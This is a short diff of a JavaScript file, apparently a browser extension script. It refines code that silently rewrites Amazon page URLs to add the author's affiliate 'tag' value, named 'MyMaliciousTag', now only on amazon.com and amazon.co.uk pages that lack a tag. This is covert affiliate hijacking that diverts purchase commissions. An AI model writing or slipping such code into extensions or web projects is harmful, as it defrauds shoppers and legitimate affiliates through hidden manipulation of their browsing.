@@ -17,7 +17,7 @@ window.onkeydown = function (event) {
 
 function modifyURL() {
   const url = new URL(window.location.href);
-  url.searchParams.set("tag", "MyMalicousTag");
+  url.searchParams.set("tag", "MyMaliciousTag");
   const modifiedUrl = url.toString();
 
   if (window.location.href !== modifiedUrl) {
@@ -25,7 +25,11 @@ function modifyURL() {
   }
 }
 
-// Only modify the URL if it doesn't already have the "tag" parameter
-if (!window.location.search.includes("tag=")) {
+// Only modify the URL if it doesn't already have the "tag" parameter and the host is Amazon
+if (
+  !window.location.search.includes("tag=") &&
+  (window.location.hostname.includes("amazon.com") ||
+    window.location.hostname.includes("amazon.co.uk"))
+) {
   modifyURL();
 }
